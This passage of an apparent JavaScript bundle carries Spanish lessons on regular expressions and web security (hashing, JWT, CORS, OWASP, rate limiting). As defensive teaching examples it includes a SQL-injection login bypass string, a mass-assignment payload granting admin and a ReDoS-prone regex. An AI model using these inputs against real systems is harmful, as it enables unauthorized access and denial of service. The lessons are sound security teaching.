2.  **Capturar:** Guardar esa parte para usarla despus. Si buscas una fecha \`(\\d{2})/\\d{2}/\\d{4}\`, el primer parntesis "captura" el da para que puedas usarlo en tu cdigo de JavaScript por separado.

## 2. Alternancia \`|\`
Es el "OR" de las Regex. 
*   \`perro|gato\`: Busca la palabra "perro" O la palabra "gato".
*   \`colou?r\`: (Recordatorio Junior) busca "color" o "colour".

## 3. Cuantificadores "Greedy" (Codiciosos) vs "Lazy"
Por defecto, las Regex intentan agarrar todo lo que pueden.
*   Texto: \`<div>Hola</div>\`
*   Regex \`/<div>.*<\\/div>/\`: Agarrar todo.
*   Si usamos \`.*?\`, se vuelve "Lazy" y se detiene en la primera coincidencia que encuentre.

---

### Misin Semi-Senior:
Aprender a extraer el nombre de usuario de una URL de perfil. 
Ej: de \`https://twitter.com/juan_perez\` solo queremos sacar \`juan_perez\`.

### Ejercicio 3:
Crea una Regex para validar una fecha en formato \`DD/MM/YYYY\`. Recuerda que el da solo puede empezar con 0, 1, 2 o 3.
|
`,completed:!1},{id:"regex-04-lookahead-behind",title:"Lookahead y Lookbehind (Aserciones)",level:"semi-senior",content:`# Leccin 04: Lookahead y Lookbehind (Aserciones)

Esta es la frontera entre un desarrollador que sabe un poco de Regex y uno profesional. Las aserciones permiten buscar algo **solo si** est seguido (o precedido) por otra cosa, pero sin incluir esa otra cosa en el resultado.

## 1. Lookahead Positivo \`(?=...)\`
Busca "X" solo si adelante tiene "Y".
*   \`\\d+(?=)\`: Busca nmeros solo si tienen el smbolo del euro al lado, pero el smbolo  no aparecer en el resultado de la bsqueda.

## 2. Lookahead Negativo \`(?!...)\`
Busca "X" solo si adelante NO tiene "Y".
*   Muy usado para validacin de contraseas: "Que tenga al menos un nmero".

## 3. Lookbehind \`(?<=...)\` y \`(?<!...)\`
Igual que el Lookahead, pero revisa lo que tiene atrs (hacia la izquierda).
*   \`(?<=\\$)\\d+\`: Busca nmeros que tengan el smbolo $ antes.

---

### Caso Real: Validacin de Password Robusta
Una contrasea que necesita: 8 caracteres, al menos una mayscula y al menos un nmero.
\`/(?=.*[A-Z])(?=.*\\d).{8,}/\`
Ves cmo cada parntesis "mira hacia adelante" buscando su condicin sin avanzar su posicin en el texto?

### Ejercicio 4:
Intenta escribir una Regex que busque palabras que NO terminen en "s".
|
`,completed:!1},{id:"regex-05-performance-seguridad",title:"Performance y Seguridad (ReDoS)",level:"senior",content:`# Leccin 05: Performance y Seguridad (ReDoS)

En el nivel Senior, una Regex mal escrita puede tirar abajo tu servidor de produccin. Literalmente.

## 1. El Catastrophic Backtracking
Cuando usas cuantificadores anidados (ej: \`(a+)+\`), y le pasas una cadena que casi coincide pero no del todo, el motor de Regex intentar millones de combinaciones para intentar que encaje.
*   **Consecuencia:** El CPU sube al 100% y el servidor deja de responder. A esto se le llama **ReDoS** (Regular Expression Denial of Service).

## 2. Cmo evitarlo
1.  Evita cuantificadores dentro de cuantificadores.
2.  S lo ms especfico posible. No uses \`.*\` si puedes usar \`[a-z]*\`.
3.  Usa herramientas de anlisis (como \`regex101.com\`) y fjate en el nmero de "Steps" (pasos). Si para una cadena corta hace 5.000 pasos, tu Regex es peligrosa.

## 3. Seguridad en el Backend
Nunca permitas que un usuario te enve una Regex personalizada para ejecutarla en tu servidor. Un atacante enviar una Regex diseada para causar Backtracking y congelar tu negocio.

---

### Visin Senior:
Un Senior prefiere escribir 10 lneas de cdigo de JavaScript legible para validar un dato complejo antes que escribir una Regex ilegible de 200 caracteres que nadie puede mantener.

### Ejercicio 5:
Busca en internet un ejemplo de Regex para validar un Email. Vers que son largusimas y complejas. Vale la pena usarlas o es mejor una Regex simple \`/^.+@.+\\..+$/\` y luego validar el resto con cdigo?
|
`,completed:!1},{id:"regex-06-practica-regex",title:"El Maestro de los Patrones",level:"senior",content:`# Evaluacin Final: El Maestro de los Patrones

Demuestra que dominas desde los smbolos bsicos hasta la seguridad en produccin.

---

## 1. Nivel Junior: El Limpiador de Cdigo
**Consigna:** Tienes un archivo con muchas lneas vacas (solo espacios). 
Qu Regex usaras para buscar todas esas lneas y poder borrarlas? (Pista: Inicio de lnea, espacios, final de lnea).

## 2. Nivel Semi-Senior: El validador de Matrculas
**Escenario:** Una matrcula de coche tiene el formato de 4 nmeros seguidos de 3 letras maysculas (ej: \`1234ABC\`). Las letras no pueden incluir vocales.
*Consigna:* Crea la Regex para validar este formato.

## 3. Nivel Senior: Anlisis de Riesgo
**Consigna:** Analiza esta Regex: \`/^([a-zA-Z0-9]+\\s?)*$/\`. 
1. Qu busca?
2. Por qu es peligrosa si se le pasa un texto de 1 milln de letras que termine en un carcter especial como \`@\`?
3. Cmo la arreglaras para que no sea vulnerable a ReDoS?

---

### Misin:
Un experto en Regex no es el que hace los patrones ms complejos, sino el que sabe usarlos con precisin quirrgica sin sacrificar la seguridad del sistema. 
|
`,completed:!1,isProject:!0}]},Kx={id:"security",title:"Seguridad en Aplicaciones Web",description:"Domina los principios de la seguridad digital, desde la proteccin de contraseas hasta la defensa contra ataques avanzados.",completed:!1,lessons:[{id:"security-01-que-es-seguridad",title:"Qu es la Seguridad Web? - Protegiendo tu Castillo",level:"junior",content:`# Leccin 01: Qu es la Seguridad Web? - Protegiendo tu Castillo

En el mundo digital, tu aplicacin es como un castillo lleno de tesoros (datos de usuarios, dinero, informacin privada). La **Seguridad Web** es el conjunto de muros, fosos y guardias que impiden que los ladrones entren.

## 1. La mentalidad del desarrollador seguro
Un programador Junior suele pensar: "Por qu alguien querra hackear mi pequeo proyecto?". 
**Realidad:** Los atacantes no siempre buscan tu proyecto especficamente; usan robots que escanean miles de webs por minuto buscando errores conocidos. La seguridad no es un "extra", es parte de construir software profesional.

## 2. Los tres pilares: CIA
En seguridad hablamos de la trada **CIA** (por sus siglas en ingls):
*   **Confidencialidad:** Solo las personas autorizadas pueden ver los datos. (Que nadie lea tus mensajes privados).
*   **Integridad:** Los datos no pueden ser modificados por accidente o por un atacante. (Que nadie cambie el precio de un producto en el carrito).
*   **Disponibilidad:** La aplicacin debe seguir funcionando incluso bajo ataque. (Que no te tiren la web abajo).

## 3. Quines son los "Hackers"?
No todos usan una capucha en un stano. Muchos errores de seguridad son explotados por scripts automticos. Tu misin es hacer que el costo de hackearte sea mayor que el beneficio que obtendran.

---

### Concepto Junior:
La seguridad es como la higiene: si no te lavas las manos, eventualmente te enfermas. Si no cuidas tu cdigo, eventualmente te hackean.

### Ejercicio Mental 1:
Si guardas la contrasea de tus usuarios en una hoja de Excel en tu escritorio, qu pilares de la trada CIA ests poniendo en riesgo?
`,completed:!1},{id:"security-02-https-candado",title:"HTTPS y la importancia del Candadito",level:"junior",content:`# Leccin 02: HTTPS y la importancia del Candadito

Seguramente viste un candado verde en la barra de tu navegador. Eso significa que la conexin es segura (HTTPS). Pero, qu significa realmente?

## 1. HTTP vs HTTPS
*   **HTTP (Humo):** Los datos viajan en texto claro. Si ests en un caf enviando tu contrasea, cualquiera que est en la misma red Wi-Fi puede "escuchar" y leer tu clave. Es como enviar una carta sin sobre.
*   **HTTPS (Sobre sellado):** Los datos se **encriptan** antes de salir de tu compu. Si alguien los intercepta, solo ver un montn de letras y nmeros sin sentido. Solo el servidor tiene la llave para desencriptarlos.

## 2. Los Certificados SSL/TLS
Para tener HTTPS, el dueo del sitio debe demostrar que es quien dice ser mediante un certificado. Hoy en da es obligatorio y gratuito gracias a servicios como **Let's Encrypt**.

## 3. Por qu es vital para el SEO y la Confianza?
*   Google penaliza a los sitios que no tienen HTTPS (salen como "No Seguros").
*   Los navegadores modernos bloquean funciones (como la cmara o la ubicacin) si el sitio no es HTTPS.

---

### Misin Junior:
Nunca, bajo ninguna circunstancia, desarrolles una aplicacin que pida datos de login sin usar HTTPS en produccin.

### Ejercicio Prctico 2:
Entra a tu sitio favorito, haz clic en el candado de la URL y busca la opcin "Certificado". Quin emiti ese certificado y cundo vence?
`,completed:!1},{id:"security-03-passwords-hashing",title:"Manejo Seguro de Passwords y Hashing",level:"junior",content:`# Leccin 03: Manejo Seguro de Passwords y Hashing

Este es el error nmero 1 de los principiantes: guardar la contrasea tal cual el usuario la escribi. Si hackean tu base de datos, tienen las claves de todos!

## 1. El pecado capital: Texto Plano
**NUNCA** guardes: \`password: "123456"\`.
Si el atacante entra a tu DB, se lleva el tesoro sin esfuerzo.

## 2. La solucin: Hashing
Un **Hash** es una funcin que convierte un texto en un cdigo nico e irreversible.
*   Entrada: "perrito123" -> Salida: \`a7b82c91...\`
*   No puedes volver del cdigo a la palabra original.

## 3. Cmo funciona el Login?
1.  El usuario se registra con "perrito123".
2.  Tu servidor lo hashea y guarda \`a7b82c91...\`.
3.  Cuando el usuario vuelve, escribe "perrito123".
4.  Tu servidor vuelve a hashear lo que escribi. Si el resultado es \`a7b82c91...\`, sabemos que es l!

## 4. El toque profesional: Salting (Sal)
Si dos usuarios usan la misma clave "123456", tendran el mismo hash. Un atacante con una lista de hashes comunes (Rainbow Tables) los descubrira fcil.
*   **Salt:** Agregamos unos caracteres aleatorios nicos a cada contrasea antes de hashearla. As, aunque la clave sea la misma, el hash final ser diferente.

---

### Librera Recomendada (Node.js):
Usa siempre **bcrypt** o **argon2**. Son libreras diseadas para ser lentas a propsito, dificultando que un atacante pruebe millones de claves por segundo.

### Ejercicio Mental 3:
Si olvidas tu contrasea en un sitio y ellos te envan un mail diciendo: "Tu contrasea actual es: 123456", ese sitio es seguro o inseguro? Por qu?
`,completed:!1},{id:"security-04-intro-jwt",title:"Introduccin a JWT (JSON Web Tokens)",level:"junior",content:`# Leccin 04: Introduccin a JWT (JSON Web Tokens)

En las aplicaciones modernas, no solemos pedir la contrasea en cada clic. Una vez que el usuario se loguea, le damos un "Pase VIP" llamado **JWT**.

## 1. Qu es un JWT?
Es un trozo de texto encriptado que contiene informacin del usuario. Es como una entrada de cine: el guardia (tu servidor) no te pregunta tu nombre cada vez, solo mira tu entrada y ve que es vlida y que pagaste por esa pelcula.

## 2. Anatoma de un JWT
Tiene 3 partes separadas por puntos:
1.  **Header:** Dice que es un JWT.
2.  **Payload (Carga):** Los datos (ej: \`userId: 5\`). **Ojo!** Estos datos se pueden leer fcil, no guardes secretos aqu.
3.  **Signature (Firma):** Es el sello de seguridad. Solo tu servidor tiene la "llave" para crear esta firma. Si alguien intenta cambiar el \`userId\` en el payload, la firma deja de ser vlida y el servidor rechaza el token.

## 3. Dnde se guarda en el navegador?
Aqu hay una batalla clsica:
*   **LocalStorage:** Fcil de usar, pero vulnerable a hackers que usen scripts (XSS).
*   **Cookies HttpOnly:** Ms seguras porque el cdigo de JavaScript no las puede leer, solo el servidor.

---

### Concepto Clave:
Un JWT es como un cheque: si alguien te lo roba, puede cobrarlo (usar tu cuenta) hasta que el cheque venza. Por eso los tokens deben durar poco tiempo (ej: 15 minutos).

### Ejercicio Prctico 4:
Entra a [jwt.io](https://jwt.io), pega un token cualquiera (hay uno de ejemplo ah) y mira qu dice el Payload. Puedes ver el nombre del usuario ficticio?
`,completed:!1},{id:"security-05-errores-comunes",title:"Errores Comunes y Variables de Entorno",level:"junior",content:`# Leccin 05: Errores Comunes y Variables de Entorno

Para cerrar el nivel Junior, vamos a ver cmo los principiantes suelen "entregar las llaves" de su aplicacin sin darse cuenta.

## 1. Subir Secretos a GitHub
Nunca, jams, pongas una clave de API, una contrasea de DB o tu clave secreta de JWT dentro de tu cdigo.
*   **Error:** \`const SECRET = "mi-clave-super-secreta-123";\`
*   **Solucin:** Usa un archivo \`.env\` y agrgalo al \`.gitignore\`. Tu cdigo debe leerlo as: \`process.env.JWT_SECRET\`.

## 2. Mensajes de error demasiado detallados
*   **Error:** "Error: La contrasea para el usuario juan@gmail.com es incorrecta".
*   **Ataque:** Ahora el hacker sabe que el email "juan@gmail.com" existe en tu sistema!
*   **Solucin:** "Email o contrasea incorrectos". No des pistas de qu parte fall.

## 3. Confiar en el Cliente (Frontend)
Nunca asumas que porque tu formulario en React valida que el email sea correcto, el servidor recibir un email correcto.
*   **Regla de Oro:** Los atacantes pueden saltearse tu frontend y enviarle basura a tu backend directamente. **Siempre valida todo de nuevo en el servidor.**

## 4. No limitar los intentos (Fuerza Bruta)
Si permites que alguien intente loguearse 1 milln de veces por segundo, eventualmente adivinar la clave.
*   **Solucin:** Bloquea la cuenta o pon un tiempo de espera despus de 5 intentos fallidos.

---

### Resumen del Nivel Junior:
1. Usa HTTPS siempre.
2. Hashea las contraseas con bcrypt/argon2.
3. No subas claves a GitHub (usa .env).
4. Desconfa de todo lo que venga del usuario.

### Ejercicio Final:
Busca en tu proyecto actual cualquier cadena de texto que sea una "clave" o "secreto". Crea un archivo \`.env\`, muvela ah y asegrate de que est en el \`.gitignore\`.
`,completed:!1},{id:"security-06-authn-authz",title:"Autenticacin vs Autorizacin (RBAC)",level:"semi-senior",content:`# Leccin 06: Autenticacin vs Autorizacin (RBAC)

Como Semi-Senior, ya no solo verificas "quin es" el usuario, sino "qu puede hacer". Estos son dos procesos distintos que ocurren en cascada.

## 1. Autenticacin (AuthN)
Es el proceso de verificar la identidad. Eres quien dices ser?
*   **Herramientas:** Login, Contraseas, MFA (2FA), Biometra.

## 2. Autorizacin (AuthZ)
Es el proceso de verificar permisos. Ya sabemos que eres "Juan", pero tienes permiso para borrar este post?
*   **Herramientas:** Roles, Permisos, Listas de Control de Acceso (ACL).

## 3. RBAC (Role-Based Access Control)
Es la forma ms comn de manejar la autorizacin en aplicaciones profesionales.
1.  **Usuarios** tienen **Roles** (ej: Admin, Editor, Viewer).
2.  **Roles** tienen **Permisos** (ej: \`edit_post\`, \`delete_user\`).
**Regla de Oro:** En tu cdigo, no verifiques el Rol (\`if user.role == 'admin'\`), verifica el Permiso (\`if user.can('delete_post')\`). Esto hace que tu sistema sea mucho ms flexible.

---

### Caso Real:
Un usuario con rol "Soporte" puede ver los datos de los clientes pero no editarlos. Si maana decides que "Soporte" tambin debe poder editar, solo cambias la configuracin del Rol en un lugar, no en 50 archivos del cdigo.

### Ejercicio 6:
Disea una tabla de permisos para una aplicacin de Hospital. Qu permisos le daras a un "Mdico", a un "Enfermero" y a un "Paciente"?
`,completed:!1},{id:"security-07-jwt-avanzado",title:"JWT Avanzado y Refresh Tokens",level:"semi-senior",content:`# Leccin 07: JWT Avanzado y Refresh Tokens

En el nivel Junior aprendiste que el JWT es un token de acceso. Pero hay un problema: si el token dura mucho, es peligroso; si dura poco, el usuario tiene que loguearse a cada rato.

## 1. El ciclo de vida de los Tokens
La solucin profesional es usar dos tokens diferentes:
*   **Access Token:** Es corto (ej: 15 minutos). Se usa para cada peticin a la API.
*   **Refresh Token:** Es largo (ej: 7 das). Se usa solo para pedir un nuevo Access Token cuando el anterior expira.

## 2. Ventaja de Seguridad
Si un atacante roba el Access Token, solo tiene 15 minutos de acceso. El Refresh Token debe estar guardado de forma hiper-segura (Cookie HttpOnly y vinculada a la IP/Dispositivo) para que no sea fcil de robar.

## 3. Revocacin de Sesiones
Con JWT puros (stateless), no puedes "cerrar la sesin" de un usuario desde el servidor. Si quieres poder banear a un usuario o cerrar sus sesiones, debes guardar el ID del Refresh Token en una base de datos (como Redis) para poder invalidarlo.

---

### Lo que hace un Semi-Senior:
Implementa un "Silent Refresh" en el frontend. Si la API devuelve un error de token expirado, el frontend pide uno nuevo automticamente usando el Refresh Token sin que el usuario se de cuenta.

### Ejercicio 7:
Por qu es una mala idea guardar el Refresh Token en LocalStorage? Investiga qu es el ataque XSS y cmo se relaciona con esto.
`,completed:!1},{id:"security-08-cors-explicado",title:"CORS - Desenmascarando al villano",level:"semi-senior",content:`# Leccin 08: CORS - Desenmascarando al villano

CORS (Cross-Origin Resource Sharing) es, probablemente, el error que ms dolores de cabeza causa a los desarrolladores. Pero no es tu enemigo; es una de las protecciones ms importantes del navegador.

## 1. Por qu existe CORS?
Imagina que ests logueado en \`tu-banco.com\`. Si entras a una pgina maliciosa \`virus.com\`, esa pgina podra intentar hacer un \`fetch\` a \`tu-banco.com/transferir-dinero\`. 
Sin el CORS, el navegador dejara que esa peticin pase. El **CORS** es el navegador preguntndole al banco: "Dejas que este sitio raro te pida cosas?".

## 2. El "Preflight" (OPTIONS)
Cuando haces una peticin compleja (ej: con un JSON o un token), el navegador primero enva una peticin automtica de tipo \`OPTIONS\`. 
*   Si el servidor responde con los encabezados correctos de "Acepto", el navegador enva la peticin real. 
*   Si el servidor no responde o no te tiene en la lista blanca, el navegador bloquea la peticin.

## 3. Configuracin Correcta (Backend)
*   **Error fatal:** \`Access-Control-Allow-Origin: *\` (Aceptas a cualquiera).
*   **Correcto:** Configura una lista blanca exacta de tus dominios (ej: \`https://mi-app.com\`).

---

### Misin Semi-Senior:
Nunca desactives el CORS para "solucionar el bug". Configralo correctamente en tu servidor usando libreras como \`cors\` en Express, especificando los mtodos (GET, POST, etc.) y los orgenes permitidos.

### Ejercicio 8:
Si tu frontend corre en \`localhost:3000\` y tu backend en \`localhost:5000\`, por qu ocurre un error de CORS si ambos estn en tu misma computadora?
`,completed:!1},{id:"security-09-owasp-ataques",title:"OWASP Top 10 y Ataques Crticos",level:"senior",content:`# Leccin 09: OWASP Top 10 y Ataques Crticos

Como Senior, diseas sistemas asumiendo que el atacante ya est adentro. Debes conocer las vulnerabilidades ms crticas segn el **OWASP** (Open Web Application Security Project).

## 1. Inyeccin (SQL y ms)
Ocurre cuando pasas datos del usuario directamente a una consulta de base de datos sin filtrar.
*   **Ataque:** El usuario escribe \`' OR 1=1 --\` en el campo de login y logra entrar sin contrasea.
*   **Defensa Senior:** Usa **Consultas Preparadas** (le paso los datos como parmetros separados, nunca pegando strings).

## 2. XSS (Cross-Site Scripting)
El atacante logra inyectar cdigo JavaScript malicioso en tu pgina que otros usuarios ven.
*   **Consecuencia:** Roban cookies de sesin, redirigen usuarios o cambian el contenido de la web.
*   **Defensa Senior:** Sanitiza todas las entradas y usa **Content Security Policy (CSP)** para decirle al navegador qu scripts puede ejecutar y cules no.

## 3. Broken Access Control
Es cuando un usuario puede acceder a datos que no son suyos simplemente cambiando un ID en la URL. (Ej: \`mi-app.com/factura/100\` -> cambio a \`101\` y veo la del vecino).
*   **Defensa Senior:** Siempre verifica la propiedad del recurso en el backend: \`WHERE id = facturaId AND userId = userLogueado\`.

---

### Visin Senior:
La seguridad no es una capa externa, es una propiedad del diseo. Un Senior aplica el principio de **Mnimo Privilegio**: cada parte del sistema solo tiene el acceso estrictamente necesario.

### Ejercicio 9:
Investiga qu es la vulnerabilidad **Log4Shell**. Por qu fue tan catastrfica y cmo se relaciona con la "Inyeccin"?
`,completed:!1},{id:"security-10-api-security",title:"Seguridad en APIs y Rate Limiting",level:"senior",content:`# Leccin 10: Seguridad en APIs y Rate Limiting

Tu API es la puerta trasera de tu aplicacin. Si alguien la descubre, puede intentar atacarla directamente sin pasar por tu bonito frontend en React.

## 1. Rate Limiting (Limitador de Velocidad)
Si permites que cualquier IP pida 10.000 datos por segundo, tu servidor se caer (Ataque DoS).
*   **Implementacin Senior:** Usa libreras como \`express-rate-limit\` o configuraciones de Nginx para limitar por IP o por usuario (ej: mximo 100 peticiones por minuto).

## 2. Mass Assignment (Asignacin Masiva)
Ocurre cuando recibes un objeto JSON y lo guardas directo en la DB.
*   **Ataque:** El usuario enva \`{ "nombre": "Juan", "role": "admin" }\`. Si tu cdigo hace \`User.update(req.body)\`, el usuario se acaba de hacer administrador.
*   **Defensa Senior:** Usa una lista blanca de campos permitidos. Nunca guardes el objeto completo del usuario sin filtrar.

## 3. Seguridad en los Encabezados (Headers)
Usa **Helmet.js** para ocultar qu tecnologa usas (ej: ocultar el header \`X-Powered-By: Express\`) y configurar protecciones automticas del navegador.

---

### Lo que hace un Senior:
Implementa **Auditora de Logs**. Cada accin sensible (cambio de contrasea, borrado de datos) debe quedar registrada: "Quin, Cundo y Desde qu IP". Esto es vital para investigar si hubo un hackeo despus de que ocurri.

### Ejercicio 10:
Qu diferencia hay entre un ataque de **DoS** y uno de **DDoS**? Cmo te protegeras de un DDoS masivo si tu servidor es pequeo?
`,completed:!1},{id:"security-11-hardening-audit",title:"Production Hardening y Auditora",level:"senior",content:`# Leccin 11: Production Hardening y Auditora

Llevar una aplicacin a produccin es como ponerla en un campo de batalla. Un Senior realiza un proceso de **Hardening** (fortalecimiento) antes de lanzar.

## 1. Secrets Management Avanzado
En produccin no usamos archivos \`.env\` en el disco. Usamos servicios como **AWS Secrets Manager**, **HashiCorp Vault** o las variables de entorno inyectadas de Vercel/Render. Esto evita que si alguien entra al servidor, pueda leer tus claves.

## 2. Docker Security
Si usas contenedores:
*   No corras como usuario \`root\`.
*   Usa imgenes base ligeras y actualizadas (ej: Alpine) para reducir la superficie de ataque.
*   Escanea tus imgenes en busca de vulnerabilidades con herramientas como \`Trivy\` o \`Snyk\`.

## 3. Vulnerability Scanning
Integra en tu Pipeline (CI/CD) herramientas que revisen tus dependencias automticamente. Si usas una librera de \`npm\` que tiene un fallo de seguridad conocido, tu despliegue debe fallar automticamente.

---

### Misin Final Senior:
La seguridad es un proceso, no un estado. Un Senior programa auditoras peridicas, revisa los logs de errores y educa al equipo sobre nuevas amenazas.

### Desafo Final:
Realiza un escaneo de seguridad a un sitio web (puedes usar herramientas online como \`Mozilla Observatory\`). Qu nota saca (A, B, C...)? Qu headers le faltan?
`,completed:!1},{id:"security-12-practica-seguridad",title:"Seguridad Avanzada",level:"senior",content:`# Ejercicios y Evaluacin: Seguridad Avanzada

Demuestra tu nivel resolviendo estos desafos de diseo y seguridad.

---

## Nivel Semi-Senior: El Flujo del Refresh Token
**Consigna:** Disea la lgica de una base de datos para manejar Refresh Tokens.
1. Qu campos necesitaras para poder invalidar una sesin especfica?
2. Escribe el pseudocdigo del endpoint \`/api/refresh\`. Qu verificaciones haces antes de dar un nuevo Access Token?

---

## Nivel Senior: Anlisis Forense
**Consigna:** Se detect que un usuario malintencionado logr entrar a la base de datos y rob la tabla de \`usuarios\`. Sin embargo, las contraseas estn hasheadas con **bcrypt + Salt**.
1. Puede el atacante entrar a las cuentas inmediatamente? Por qu?
2. Qu tcnica usara el atacante para intentar descubrir las claves reales (fuerza bruta, rainbow tables, etc.)?
3. Como Senior, qu le diras a los usuarios en el comunicado oficial y qu acciones tcnicas forzaras inmediatamente?

---

## Evaluacin Final de Seguridad
*   Cul es la diferencia tcnica entre **RBAC** y **ABAC**?
*   Explica qu es un ataque **CSRF** y cmo se previene usando SameSite Cookies.
*   En una arquitectura de Microservicios, cmo aseguras la comunicacin interna entre el "Servicio de Pagos" y el "Servicio de Usuarios"?

---

### Resultado Esperado:
Un ingeniero que no solo sabe "parchar" agujeros, sino que disea sistemas que son inherentemente seguros desde su concepcin. 
`,completed:!1,isProject:!0}]},$x={id:"software-engineering",title:"Ingeniera de Software",description:"Transforma tu mentalidad de programador a Ingeniero. Aprende a construir sistemas robustos, mantenibles y escalables en el mundo real.",completed:!1,track:"Fundamentos de Ingeniera",lessons:[{id:"se-01-fundamentos",title:"Qu es la Ingeniera de Software?",level:"junior",content:`# Leccin 1: Qu es la Ingeniera de Software?

Mucha gente escribe cdigo, pero no todos hacen **Ingeniera de Software**. La diferencia radica en la escala, la mantenibilidad y el trabajo en equipo.

## 1. Programacin vs. Ingeniera
*   **Programacin:** Escribir cdigo para que una computadora haga algo (ej: un script personal).
*   **Ingeniera de Software:** Aplicar principios sistemticos y disciplinados al desarrollo, operacin y mantenimiento del software. Es resolver problemas **reales** para **clientes reales** con restricciones (tiempo, dinero, equipo).

## 2. Los pilares de la Ingeniera
Un ingeniero se preocupa por:
1.  **Mantenibilidad:** Podr otro programador entender y modificar esto en 2 aos?
2.  **Escalabilidad:** Funcionar si pasamos de 10 a 10 millones de usuarios?
3.  **Confiabilidad:** El sistema falla elegantemente o colapsa?
4.  **Eficiencia:** Usa los recursos necesarios sin desperdicio?

## 3. El costo del cambio
El principio fundamental es que **corregir un error en la etapa de requisitos es 100 veces ms barato que corregirlo en produccin**. Por eso, un ingeniero **piensa antes de codificar**.

---

### Misin Junior:
Reflexiona sobre tu ltimo proyecto personal. Cunto tiempo dedicaste a planear antes de escribir la primera lnea de cdigo? Un Ingeniero Junior empieza a cambiar la proporcin de 90% codificar / 10% pensar a 60% codificar / 40% pensar.
`,completed:!1},{id:"se-02-ciclo-vida",title:"El Ciclo de Vida del Software (SDLC)",level:"junior",content:`# Leccin 2: Ciclo de Vida del Software (SDLC)

El desarrollo no es un acto de magia, es un proceso. **SDLC (Software Development Life Cycle)** define las fases desde la idea hasta el retiro del software.

## 1. Las Fases Clsicas
1.  **Requisitos:** Qu necesita el cliente? (La frase "No s, verlo quiero" es peligrosa).
2.  **Anlisis:** Es factible? Qu tecnologa usar?
3.  **Diseo:** Modelado de la solucin (diagramas, wireframes, arquitectura).
4.  **Implementacin:** Escribir el cdigo (Programacin).
5.  **Pruebas (Testing):** Funciona como se espera?
6.  **Despliegue (Deployment):** Enviar a produccin.
7.  **Mantenimiento:** Corregir bugs y aadir features.

## 2. Metodologas
Cmo organizamos esas fases en el tiempo.
*   **Cascada (Waterfall):** Terminas una fase entera antes de pasar a la siguiente (Lento, rgido, ideal para construccin fsica, no software).
*   **gil (Agile):** Ciclos cortos (sprints) donde entregas pequeas partes del software funcionando frecuentemente (Scrum, Kanban). **Es el estndar de la industria hoy.**

## 3. DevOps
La integracin continua de desarrollo y operaciones. Elimina el muro entre "Yo hice el cdigo" y "Yo lo despliego".

---

### Misin Junior:
Imagina que debes construir una tienda online. Describe brevemente qu haras en cada una de las 7 fases del SDLC para este proyecto. Te dars cuenta que programar es solo una parte pequea del total.
`,completed:!1},{id:"se-03-requerimientos",title:"Ingeniera de Requisitos",level:"junior",content:`# Leccin 3: Ingeniera de Requisitos

El mayor error de un desarrollador Junior es empezar a programar sin entender qu se necesita realmente. Los **requisitos** son el contrato entre el problema y la solucin.

## 1. Tipos de Requisitos
*   **Funcionales:** Lo que el sistema **debe hacer** (ej: "El usuario debe poder iniciar sesin con Google"). Son visibles para el usuario final.
*   **No Funcionales (Atributos de Calidad):** Cmo debe comportarse el sistema (ej: "La pgina debe cargar en menos de 2 segundos", "La contrasea debe estar encriptada"). Son crticos para la arquitectura.

## 2. Historias de Usuario (User Stories)
El formato gil estndar:
> "Como [rol], quiero [accin], para [beneficio]."
*   Ejemplo: "Como *cliente*, quiero *filtrar productos por precio*, para *encontrar ofertas que se ajusten a mi presupuesto*."

## 3. Criterios de Aceptacin
Las condiciones especficas para decir "esto est terminado".
*   Ejemplo para el login:
    *   Verificar email vlido.
    *   Mostrar error si la contrasea es incorrecta.
    *   Redirigir al dashboard al xito.

---

### Misin Junior:
Escribe 3 Historias de Usuario para una aplicacin de lista de tareas (To-Do List), incluyendo sus Criterios de Aceptacin. Sin esto, no sabrs cundo has terminado de programar.
`,completed:!1},{id:"se-04-documentacion",title:"Documentacin: El Mapa del Tesoro",level:"junior",content:`# Leccin 4: Documentacin Tcnica Bsica

El cdigo se lee muchas ms veces de las que se escribe. La documentacin es el mapa que dejas para tu "yo del futuro" y para tu equipo.

## 1. Niveles de Documentacin
1.  **Cdigo Auto-documentado:** Nombres de variables y funciones tan claros que no necesitan explicacin (\`getUserById\` es mejor que \`getData\`).
2.  **Comentarios en Cdigo:** Solo para explicar el **POR QU** de una lgica compleja, no el QU (eso se ve leyendo el cdigo).
3.  **Documentacin de API / Funciones:** JSDoc, Swagger. Explica inputs, outputs y posibles errores.
4.  **Documentacin de Proyecto (README):** La cara del proyecto.

## 2. El README.md perfecto
Todo repositorio debe tener uno. Estructura mnima:
*   **Ttulo y Descripcin:** Qu es esto?
*   **Instalacin:** \`npm install ...\`
*   **Uso:** Ejemplos rpidos de cmo correrlo.
*   **Contribucin:** Gua para otros devs.

## 3. Diagramas Simples
No necesitas UML complejo. Un diagrama de flujo o un diagrama de secuencia simple en una pizarra (o herramienta como Mermaid.js) vale ms que 1000 lneas de texto.

---

### Misin Junior:
Crea un \`README.md\` para tu ltimo proyecto. Imagina que un extrao lo descarga. Podra hacerlo funcionar sin preguntarte nada? Si la respuesta es no, tu documentacin fall.
`,completed:!1},{id:"se-05-uml",title:"UML: El Lenguaje Visual",level:"semi-senior",content:`# Leccin 5: UML (Unified Modeling Language) - El Lenguaje Visual de la Ingeniera

UML no es solo "dibujitos". Es el estndar *de facto* para visualizar, especificar y documentar sistemas de software. Como Semi-Senior, dejas de pensar en cdigo lineal y empiezas a pensar en **estructuras y relaciones**.

## 1. Por qu UML?
Imagina explicar la estructura de un rascacielos solo con palabras. Imposible. UML es el plano del arquitecto de software.
*   **Estandarizacin:** Un diagrama de clases se entiende igual en Japn que en Argentina.
*   **Abstraccin:** Te permite ignorar detalles de implementacin (cdigo) y centrarte en la lgica del sistema.
*   **Comunicacin:** Es mucho ms rpido discutir sobre un diagrama que leer 5000 lneas de cdigo.

## 2. Los Diagramas Esenciales
Aunque UML tiene 14 tipos de diagramas, en la prctica profesional dominamos 3 principales:

### A. Diagrama de Clases (Estructural)
El ms importante para POO. Muestra las clases, sus atributos, mtodos y **relaciones**.
*   **Herencia (Generalizacin):** Flecha con tringulo vaco (\`Estudiante --|> Persona\`).
*   **Composicin:** Rombo relleno (\`Libro *-- Pagina\`). Si el libro muere, las pginas tambin.
*   **Agregacin:** Rombo vaco (\`Curso o-- Estudiante\`). El estudiante existe sin el curso.
*   **Asociacin:** Lnea simple (\`Profesor -- Asignatura\`).

**Ejemplo de Cdigo vs UML:**
\`\`\`typescript
class Motor { ... }
class Auto {
  private motor: Motor; // Composicin
}
\`\`\`
En UML: \`Auto *--> Motor\`.

### B. Diagrama de Secuencia (Comportamiento)
Muestra cmo interactan los objetos **en el tiempo**. Vital para entender flujos complejos.
*   **Actores:** Usuario, Sistema Externo.
